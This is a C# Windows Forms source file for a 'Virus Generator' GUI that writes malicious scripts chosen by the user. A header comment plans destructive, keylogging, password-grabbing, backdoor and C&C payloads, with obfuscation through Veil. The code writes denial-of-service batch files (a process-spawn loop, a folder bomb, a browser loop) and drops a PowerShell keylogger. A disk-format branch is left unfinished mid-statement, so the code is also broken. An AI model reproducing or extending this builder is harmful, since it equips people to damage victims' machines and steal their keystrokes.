/*

Project: Virus Generator

Goals: 
1. Make a gui program that will take some user input and output a virus.
2. Viruses can be ran through Veil to further obfustecate the signature
3. Can Generate .exe, .bat files (soon will support many formats) - .bat files supported.


TODO:
1. Support '.exe' files. Learn how to compile 
2. Support '.py' viruses -- Write a bunch of viruses in python and then add them as resources for this project.
3. Embed viruses in other programs.
4. Add a help wiki/Readme
5. Add 'categories' of viruses i.e destructive, exfiltration, spying, etc.
 
Logic:
1. Take some user input about what kind of virus they want to generate
2. Write out those specifications to a file.

Categories:
1. Destructive
    a. Format C: Drive
    b. Overheat CPU / RAM
2. Espionage
    a. Keylogger
    b. Screen capture
    c. Browser History
    d. Password Grabbing
    e. Wifi Password Grabbing
3. Recon
    a. LAN scanning
    b. User accounts - create / delete
    c. Pivoting
4. Control
    a. Disable mouse/keyboard
    b. Disable USB ports
5. Backdoor?
6. C&C?
*/




using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace VirusGenerator
{
    public partial class Troy : Form
    {



        // Init class level variables
        string _outputFolder;
        string _fileName;
        string _fileExt;
        public Troy()
        {
            InitializeComponent();
            // MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
        }
        /// <summary>
        /// Purpose: When clicked, the 'generate' button writes a bunch of text to file and saves it with whatever format the user specified.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnGen_Click(object sender, EventArgs e)
        {

            _outputFolder = @TxtBoxDes.Text; //The @ escapes the folder location (i.e C:\\Users\\..)
            _fileName = TxtBoxFileName.Text;
            _fileExt = CBoxFor.Text;



            //Where the magic happens.
            if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
            {
                string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
                File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
            }
            if (CBoxAttack.Text == "Folder Bomb Attack")
            {

                string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
                File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
            }

            if (CBoxAttack.Text == "Keylogger")
            {
                if (!Directory.Exists(_outputFolder + "Get-Keystrokes"))
                {
                    // Resource variables
                    string getKeys = Properties.Resources.Get_Keystrokes;
                    string readmeKeylogger = Properties.Resources.readmeKeylogger;
                    string copyKeylogger = Properties.Resources.copyKeylogger;

                    MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");

                    _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
                    _fileExt = ".ps1";

                    string folderPath = _outputFolder + "Get-Keystrokes";

                    Path.Combine(folderPath, _fileName);
                    Directory.CreateDirectory(folderPath); //Create the directory.


                    File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
                    File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
                    File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);

                    System.Diagnostics.Process.Start(folderPath);

                    ToolStrip.Text = $"Folder created at {folderPath}";
                }
                else
                {
                    MessageBox.Show("The folder already exists!", "Notice");
                    ToolStrip.Text = "Folder already exists!";

                }

            }


            if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
            {
                MessageBox.Show("This attack only works in a '.bat' format. This will be done automatically for you.");

                _fileExt = ".bat";

                string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyan.cat", "goto loop" };
                File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);

                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";


            }

            if(CBoxAttack.Text == "Format Harddisk")
            {
                System.Diagnostics.Process formatHarddrive = new System.Diagnostics.Process();

                DriveInfo di = 
                
            }


        }

        /// <summary>
        /// Purpose: Changes toolstrip text when the format is changed.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
        {
            string formatSelected = CBoxFor.Text;

            ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
        }

        /// <summary>
        /// Purpose: Displays About message when clicked.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void versionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015", "About"); //About message
        }

        /// <summary>
        /// Purpose: Exits program when clicked.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnExit_Click(object sender, EventArgs e)
        {
            Close(); //closes program when clicked.
        }

        /// <summary>
        /// Purpose: updates tool strip as name changes.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void TxtBoxFileName_TextChanged(object sender, EventArgs e)
        {
            ToolStrip.Text = $"Name Chosen: '{TxtBoxFileName.Text}'"; //shows updated name in the tool stip

        }

        /// <summary>
        /// Purpose: Changes toolstrip text when a different attack is selected.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CBoxAttack_SelectedIndexChanged(object sender, EventArgs e)
        {
            string attackSelected = CBoxAttack.Text;

            //More code will go here.

            ToolStrip.Text = $"Attack Selected: '{attackSelected}'";
        }

        /// <summary>
        /// Purpose: Closes program when selected.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close(); //closes program from the menu stip.
        }

        /// <summary>
        /// Purpose: When a category is chosen, then the list of virus attacks are updated based on the category.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CBoxCategory_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(CBoxCategory.Text == "Destructive")
            {
                //CBoxAttack.S

                ToolStrip.Text = $"Category chosen: '{CBoxCategory.Text}'";
            }
        }

        /// <summary>
        /// Purpose: This is a button that allows the user to select the folder they want to output the virus to through an interface.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnFolderSelect_Click(object sender, EventArgs e)
        {
            
            FolderBrowserDialog folderSelect = new FolderBrowserDialog();
            folderSelect.ShowDialog();
            TxtBoxDes.Text = folderSelect.SelectedPath + "\\";
            ToolStrip.Text = $"Output folder changed to {folderSelect.SelectedPath}\\";

        }
    }
}
